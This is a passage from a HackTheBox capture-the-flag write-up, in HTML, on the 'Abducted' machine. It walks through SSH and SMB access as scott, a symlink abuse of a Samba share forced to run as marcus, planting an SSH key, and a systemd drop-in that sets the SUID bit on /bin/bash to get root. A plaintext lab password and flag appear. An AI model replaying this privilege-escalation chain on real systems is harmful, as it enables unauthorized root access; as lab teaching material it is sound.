+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Boom. We found what we were looking for, a <strong>password</strong>! I went ahead and tried it with both <strong>marcus</strong> and <strong>scott</strong>, and was able to use it to SSH into <strong>scott</strong>&rsquo;s account:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh scott@10.129.27.170                           
+</span></span><span style="display:flex;"><span>scott@10.129.27.170<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>scott@abducted:~$ </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Alright, now that we got a shell open as <strong>scott</strong>, we have some more leverage. The <strong>user.txt</strong> flag was located in his home directory <strong>/home/scott</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:~$ cat user.txt
+</span></span><span style="display:flex;"><span>92ff4699a085c8f6762e80f5893e952e</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Now that we got that out the way, I had to privesc. I did some more manual enumeration just to check if the user was capable of anything, but sadly nothing special. I also didn&rsquo;t have access to <strong>marcus</strong>&rsquo;s home folder, which led me to believe that I&rsquo;d need to move <em>laterally</em> before going root.<br>
+ <br>
+From the <strong>scott</strong> user, I finally had access to the <strong>projects</strong> smb share in the <strong>/srv</strong> directory! However, the files in it were NOT as interesting as I had hoped&hellip; there was only a <em>single</em> README file.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:/srv/projects$ ls
+</span></span><span style="display:flex;"><span>README.txt
+</span></span><span style="display:flex;"><span>scott@abducted:/srv/projects$ cat README.txt 
+</span></span><span style="display:flex;"><span>Hartley Group - internal project store</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Yeah&hellip; just a tiny message telling me what the share was for&hellip;<br>
+ <br>
+This wasn&rsquo;t the end though, I had some traction now with <strong>scott</strong>&rsquo;s account, with <em>write access</em> to all smb shares.<br>
+ <br>
+I figured I&rsquo;d take a look into <strong>marcus</strong>&rsquo;s groups to see if he was a part of anything that <strong>scott</strong> wasn&rsquo;t.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:/srv/projects$ groups marcus
+</span></span><span style="display:flex;"><span>marcus : marcus operators</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>This was different than <strong>scott</strong>, as <strong>marcus</strong> was a part of the <strong>operators</strong> group. Curious, I tried to find what exactly this group allowed him to do that I couldn&rsquo;t:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:/srv/projects$ find / -group operators 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/etc/systemd/system/smbd.service.d</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>There it is. The <strong>operators</strong> group that <strong>marcus</strong> is in allows him control over the systemd <strong>Samba</strong> service! Though I couldn&rsquo;t access the <strong>smbd.service.d</strong> directory from <strong>scott</strong>, I <em>was</em> able to see the contents of the <strong>Samba configuration</strong> in <strong>/etc/samba/</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:/etc/samba$ cat smb.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>global<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   workgroup <span style="color:#f92672">=</span> WORKGROUP
+</span></span><span style="display:flex;"><span>   server string <span style="color:#f92672">=</span> Hartley Group Document Services
+</span></span><span style="display:flex;"><span>   netbios name <span style="color:#f92672">=</span> ABDUCTED
+</span></span><span style="display:flex;"><span>   map to guest <span style="color:#f92672">=</span> Bad User
+</span></span><span style="display:flex;"><span>   guest account <span style="color:#f92672">=</span> nobody
+</span></span><span style="display:flex;"><span>   security <span style="color:#f92672">=</span> user
+</span></span><span style="display:flex;"><span>   printing <span style="color:#f92672">=</span> sysv
+</span></span><span style="display:flex;"><span>   load printers <span style="color:#f92672">=</span> no
+</span></span><span style="display:flex;"><span>   disable spoolss <span style="color:#f92672">=</span> no
+</span></span><span style="display:flex;"><span>   unix extensions <span style="color:#f92672">=</span> no
+</span></span><span style="display:flex;"><span>   allow insecure wide links <span style="color:#f92672">=</span> yes
+</span></span><span style="display:flex;"><span>   log level <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>   include <span style="color:#f92672">=</span> /etc/samba/shares.conf
+</span></span><span style="display:flex;"><span>scott@abducted:/etc/samba$ cat shares.conf 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>HP-Reception<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   comment <span style="color:#f92672">=</span> Reception printer
+</span></span><span style="display:flex;"><span>   path <span style="color:#f92672">=</span> /var/spool/samba
+</span></span><span style="display:flex;"><span>   printable <span style="color:#f92672">=</span> yes
+</span></span><span style="display:flex;"><span>   guest ok <span style="color:#f92672">=</span> yes
+</span></span><span style="display:flex;"><span>   print command <span style="color:#f92672">=</span> /usr/local/bin/printaudit %J %s
+</span></span><span style="display:flex;"><span>   lpq command <span style="color:#f92672">=</span> /bin/true
+</span></span><span style="display:flex;"><span>   lprm command <span style="color:#f92672">=</span> /bin/true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>projects<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   comment <span style="color:#f92672">=</span> Hartley Group Project Files
+</span></span><span style="display:flex;"><span>   path <span style="color:#f92672">=</span> /srv/projects
+</span></span><span style="display:flex;"><span>   valid users <span style="color:#f92672">=</span> scott
+</span></span><span style="display:flex;"><span>   read only <span style="color:#f92672">=</span> no
+</span></span><span style="display:flex;"><span>   browseable <span style="color:#f92672">=</span> yes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>transfer<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   comment <span style="color:#f92672">=</span> Staff file transfer
+</span></span><span style="display:flex;"><span>   path <span style="color:#f92672">=</span> /srv/transfer
+</span></span><span style="display:flex;"><span>   valid users <span style="color:#f92672">=</span> scott
+</span></span><span style="display:flex;"><span>   force user <span style="color:#f92672">=</span> marcus
+</span></span><span style="display:flex;"><span>   read only <span style="color:#f92672">=</span> no
+</span></span><span style="display:flex;"><span>   wide links <span style="color:#f92672">=</span> yes
+</span></span><span style="display:flex;"><span>   browseable <span style="color:#f92672">=</span> yes</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The contents of <strong>shares.conf</strong> were especially useful, as it revealed that filesystem of the <strong>transfer</strong> share would be ran as <strong>marcus</strong>. This meant that whatever I uploaded into <strong>transfer</strong> as <strong>scott</strong> would run commands as <strong>marcus</strong>.<br>
+ <br>
+With this knowledge, I went back into the <strong>transfer</strong> share as <strong>scott</strong> and created a <strong>symlink</strong> pointing to <strong>marcus</strong>&rsquo;s home directory. Since I wasn&rsquo;t able to access it as my current user, creating a symlink in the transfer share and <em>then</em> trying to open it through <strong>smb</strong> should allow me access!</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scott@abducted:/srv/transfer$ ln -s /home/marcus marcus_home
+</span></span><span style="display:flex;"><span>scott@abducted:/srv/transfer$ ls
+</span></span><span style="display:flex;"><span>marcus_home</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Link created. All I had to do now was open another terminal on my attacker machine and use <strong>smbclient</strong> to open it up:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# smbclient //10.129.27.170/transfer -U scott%iXzvcib3SrpZ
+</span></span><span style="display:flex;"><span>Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> dir
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Mon Jun <span style="color:#ae81ff">15</span> 16:03:58 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Mon Jun <span style="color:#ae81ff">15</span> 16:03:58 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  marcus_home                         D        <span style="color:#ae81ff">0</span>  Thu Jun  <span style="color:#ae81ff">4</span> 06:47:57 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5768764</span> blocks of size 1024. <span style="color:#ae81ff">2301768</span> blocks available
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\&gt;</span> cd marcus_home<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>arcus_home<span style="color:#ae81ff">\&gt;</span> ls
+</span></span><span style="display:flex;"><span>  .                                   D        <span style="color:#ae81ff">0</span>  Thu Jun  <span style="color:#ae81ff">4</span> 06:47:57 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Jun  <span style="color:#ae81ff">4</span> 06:41:30 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  .profile                            H      <span style="color:#ae81ff">807</span>  Sun Mar <span style="color:#ae81ff">31</span> 01:41:03 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  .bash_logout                        H      <span style="color:#ae81ff">220</span>  Sun Mar <span style="color:#ae81ff">31</span> 01:41:03 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  .bash_history                       H        <span style="color:#ae81ff">0</span>  Thu Jun  <span style="color:#ae81ff">4</span> 06:47:57 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>  .bashrc                             H     <span style="color:#ae81ff">3771</span>  Sun Mar <span style="color:#ae81ff">31</span> 01:41:03 <span style="color:#ae81ff">2024</span>
+</span></span><span style="display:flex;"><span>  .cache                             DH        <span style="color:#ae81ff">0</span>  Thu Jun  <span style="color:#ae81ff">4</span> 06:41:30 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">5768764</span> blocks of size 1024. <span style="color:#ae81ff">2301768</span> blocks available</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Boom! I successfully had control over <strong>marcus</strong>&rsquo;s home directory, running as him!<br>
+ <br>
+To give myself <strong>ssh</strong> access, I went ahead and created a <strong>.ssh</strong> folder through smbclient and added my attacker machine&rsquo;s <strong>id_rsa.pub</strong> key in <strong>authorized_keys</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>arcus_home<span style="color:#ae81ff">\&gt;</span> mkdir .ssh
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>arcus_home<span style="color:#ae81ff">\&gt;</span> cd .ssh
+</span></span><span style="display:flex;"><span>smb: <span style="color:#ae81ff">\m</span>arcus_home<span style="color:#ae81ff">\.</span>ssh<span style="color:#ae81ff">\&gt;</span> put /root/.ssh/id_rsa.pub authorized_hosts
+</span></span><span style="display:flex;"><span>putting file /root/.ssh/id_rsa.pub as <span style="color:#ae81ff">\m</span>arcus_home<span style="color:#ae81ff">\.</span>ssh<span style="color:#ae81ff">\a</span>uthorized_hosts <span style="color:#f92672">(</span>1.3 kB/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.3 kB/s<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Now, I was able to <strong>ssh</strong> into the machine as <strong>marcus</strong> with no password necessary:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh marcus@10.129.27.170
+</span></span><span style="display:flex;"><span>marcus@abducted:~$ </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Success, I finally got access to the <strong>marcus</strong> user! I changed directories into the Samba daemon that the <strong>operators</strong> group had access to:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>marcus@abducted:~$ cd /etc/systemd/system/smbd.service.d/
+</span></span><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>drwxrws---  <span style="color:#ae81ff">2</span> root operators <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">4</span> 13:41 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">26</span> root root      <span style="color:#ae81ff">4096</span> Jun  <span style="color:#ae81ff">4</span> 13:41 ..</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Being able to write to this directory meant that I&rsquo;d be able to add a <strong>malicious drop-in</strong> configuration to be ran upon the <strong>smbd</strong> service starting. Since the service ran as root, that meant that I&rsquo;d be able to escalate my current shell into a <strong>root</strong> shell with the right configuration.<br>
+ <br>
+I created a <strong>payload.conf</strong> file to be used and placed it into the <strong>smbd.service.d</strong> directory, which runs upon starting up <strong>Samba</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ ls
+</span></span><span style="display:flex;"><span>payload.conf
+</span></span><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ cat payload.conf 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ExecStartPre<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#39;chmod +s /bin/bash&#39;</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Essentially, when the system starts the <strong>Samba daemon</strong>, the <strong>ExecStartPre</strong> command instructs <strong>systemd</strong> to make <strong>/bin/bash</strong> an SUID executable. All I had to do after placing the configuration file in was restart the <strong>smbd</strong> service, check its status to make sure the configuration worked, and initialize a shell with the SUID bit set:</p>
+<h2 id="privesc" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>PRIVESC</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl restart smbd
+</span></span><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ systemctl status smbd
+</span></span><span style="display:flex;"><span>● smbd.service - Samba SMB Daemon
+</span></span><span style="display:flex;"><span>     Loaded: loaded <span style="color:#f92672">(</span>/usr/lib/systemd/system/smbd.service; en&gt;
+</span></span><span style="display:flex;"><span>    Drop-In: /etc/systemd/system/smbd.service.d
+</span></span><span style="display:flex;"><span>             └─payload.conf
+</span></span><span style="display:flex;"><span>     Active: active <span style="color:#f92672">(</span>running<span style="color:#f92672">)</span> since Mon 2026-06-15 23:31:26 U&gt;
+</span></span><span style="display:flex;"><span>       Docs: man:smbd<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>             man:samba<span style="color:#f92672">(</span>7<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>             man:smb.conf<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Process: <span style="color:#ae81ff">2929</span> ExecCondition<span style="color:#f92672">=</span>/usr/share/samba/is-configure&gt;
+</span></span><span style="display:flex;"><span>    Process: <span style="color:#ae81ff">2932</span> ExecStartPre<span style="color:#f92672">=</span>/bin/bash -c chmod +s /bin/bas&gt;
+</span></span><span style="display:flex;"><span>   Main PID: <span style="color:#ae81ff">2935</span> <span style="color:#f92672">(</span>smbd<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     Status: <span style="color:#e6db74">&#34;smbd: ready to serve connections...&#34;</span>
+</span></span><span style="display:flex;"><span>      Tasks: <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>limit: 4603<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     Memory: 7.5M <span style="color:#f92672">(</span>peak: 7.8M<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        CPU: 82ms
+</span></span><span style="display:flex;"><span>     CGroup: /system.slice/smbd.service
+</span></span><span style="display:flex;"><span>             ├─2935 /usr/sbin/smbd --foreground --no-process-&gt;
+</span></span><span style="display:flex;"><span>marcus@abducted:/etc/systemd/system/smbd.service.d$ /bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.2# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>bash-5.2# </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Finally, we&rsquo;ve got <strong>root</strong>. I grabbed the <strong>root.txt</strong> flag located in <strong>/root</strong> and called it a day:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.2# cat root.txt
